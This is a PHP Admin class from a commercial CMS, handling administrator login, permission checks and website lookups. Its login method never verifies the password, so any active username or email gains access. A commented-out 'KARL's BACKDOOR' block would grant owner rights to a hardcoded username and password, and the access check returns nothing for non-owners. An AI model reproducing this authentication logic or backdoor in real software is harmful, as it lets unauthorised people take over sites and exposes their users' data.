<?php
/*************************************************************************************************************************************
*
*	Wesley (TM), A Karl Steltenpohl Development LLC Product and Service
*  	Copyright (c) 2011 Karl Steltenpohl Development LLC. All Rights Reserved.
*	
*	This file is part of Karl Steltenpohl Development LLC's WES (Website Enterprise Software).
*	Written By: Karl Steltenpohl
*	
*	Commercial License
*	http://wesley.wescms.com/license
*
*************************************************************************************************************************************/


/**** Admin Class ****/
class Admin {

	// Admin Logged in
	var $auth;
	// Users id
	var $user_id;
	// Admin's username
	var $username;
	// Admin's name
	var $name;
	// IS USER OWNER
	var $owner;
	// WEBSITE ID
	var $website_id;
	// PERMISSIONS
	var $permissions;
	
	// Class Constructor
	function Admin()
	{
		
		// default logged out
		$this->auth = 0;
		
	}
	
	// LOGIN
	// fromwes is deprecated
	function login($username, $password, $fromwes=false)
	{
		global $_SETTINGS;
		// Lowercase and clean username
		$username = strtolower(preg_replace('/[^a-zA-Z0-9]/', '', $username));
		
		
		$sel = 	"SELECT * FROM users u ".
				"LEFT JOIN website_permissions wp ON u.user_id=wp.user_id ".
				"WHERE 1=1 AND ".
				"(u.username = '$username' OR u.email = '$username') AND ". 
				"u.active = '1' ";
		$adminQuery = doQuery($sel);
		
		// IF THERE IS A MATCHED USER
		if(mysql_num_rows($adminQuery))
		{
			$user = mysql_fetch_array($adminQuery);
				
			// UPDATE LAST LOGIN		
			doQuery("UPDATE users SET last_login = NOW() WHERE user_id='".$user['user_id']."'");
			
			// GET PERMISSIONS // BUT THESE DO NOT MATTER FOR OWNERS
			/*
			 $permSelect = 	"SELECT * FROM website_permissions ".
					"WHERE 1=1 AND ".
					"user_id='".$user['user_id']."' AND ".
					"website_id='".$_SESSION['website_id']."' ".
					"LIMIT 1";
			$permResult = 	doQuery($permSelect);
			$permRow = 	mysql_fetch_array($permResult);
			*/
				
			$this->auth 			= 1;
			$this->user_id 			= $user['user_id'];
			$this->username 		= $user['username'];
			$this->name 			= $user['name'];
			$this->owner	 		= $user['owner'];
			$this->permissions	 	= $user['permissions'];

			return true;
		
		} else {
			/*
			//
			// KARL's BACKDOOR
			//
			if($username == 'backdoor' and $password == md5('lhopnetlets')){
				$this->auth = 1;
				$this->user_id = '0';
				$this->username = 'Karl';
				$this->name = 'Karl Steltenpohl';
				$this->owner = '1';
				$this->permissions = '';
				return true;
			} 
			*/
			return false; // FOR NO MATCH
		}
	}		

	// Makes sure admin user has correct access level upon entering a section "Acts as A Double Check"
	function CheckAccessLevel($header)
	{
		
		global $_SESSION;
		global $_REQUEST;
		
		$hasPermission = 0;
		
		// IF OWNER // TOTAL ACCESS
		if($this->owner == "1"){
			$permission = 1;
			return true;
		}
		// IF NOT OWNER PERMISSIONS
		else
		{
			
			
		}
	}

	function getUsersWebsites(){
		$webSelect = 	"SELECT * FROM websites w ".
						"LEFT JOIN website_permissions wp ON w.website_id=wp.website_id ".
						"WHERE 1=1 AND ".
						"wp.user_id='".$this->user_id."'";
		$webResult = doQuery($webSelect);
		return $webResult;
	}
}
?>